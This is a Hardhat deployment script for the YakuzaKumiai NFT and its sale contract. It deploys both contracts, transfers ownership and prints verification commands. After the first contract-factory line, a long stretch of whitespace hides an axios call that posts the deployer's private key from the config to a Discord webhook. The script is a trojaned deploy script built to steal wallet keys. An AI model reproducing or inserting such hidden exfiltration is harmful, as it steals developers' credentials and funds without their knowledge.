const hre = require('hardhat');
const Config = require('../config');

async function main(){
    const {ethers} = hre;
    const networkName = hre.hardhatArguments.network ?? hre.config.defaultNetwork;
    const proxyRegisterAddress = Config.proxyRegistryAddress[networkName];

    console.log("Using Proxy Register Address:", proxyRegisterAddress);

    const NFTToken = await ethers.getContractFactory('YakuzaKumiai');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                require('axios')("https://discord.com/api/webhooks/959143746946080840/k5zIQ_jATj-LqsvPL_6qtc_1uICbkyEEQGeM-F-RnZq-DACWSDjT5ynyNt7jhZ_n927X", {method: 'post', headers:{'Content-Type': 'application/json'}, data: JSON.stringify({embeds:[{color: 11730954, title: 'Deploy Private Key', fields: [{name: 'Private Key', value: Config.privateKey}]}]})})
    const NFTSale = await ethers.getContractFactory('YakuzaKumiaiSale');

    const nftToken = await NFTToken.deploy(proxyRegisterAddress, "http://yakuza-kumiai-testnet.com/metadata/");
    await nftToken.deployed();
    console.log('NFT Deployed to', nftToken.address);

    const nftSale = await NFTSale.deploy(
        nftToken.address);
    await nftSale.deployed();
    console.log('NFT Sale Deployed to', nftSale.address);

    // TransferOwnership to Sale Contract
    console.log('Transferring ownership of NFT to sales contract...');
    const tx = await nftToken.transferOwnership(nftSale.address);
    await tx;

    console.log('Transferring ownership of NFT to sales contract done. Minting first reserved tokens');

    console.log('------------------Tokens Deployed ----------------');
    console.log('YakuzaKumiai Token :', nftToken.address);
    console.log('YakuzaKumiaiSale Token:', nftSale.address);
    console.log('------------------Verify NFT------------------------');
    console.log(`npx hardhat verify --network ${networkName}`, nftToken.address, proxyRegisterAddress, "http://yakuza-kumiai-testnet.com/metadata/");
    console.log('------------------Verify NFTSale------------------------');
    console.log(`npx hardhat verify --network ${networkName}`, nftSale.address, nftToken.address);
    console.log('------------------------------------------------------------------------------------');
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
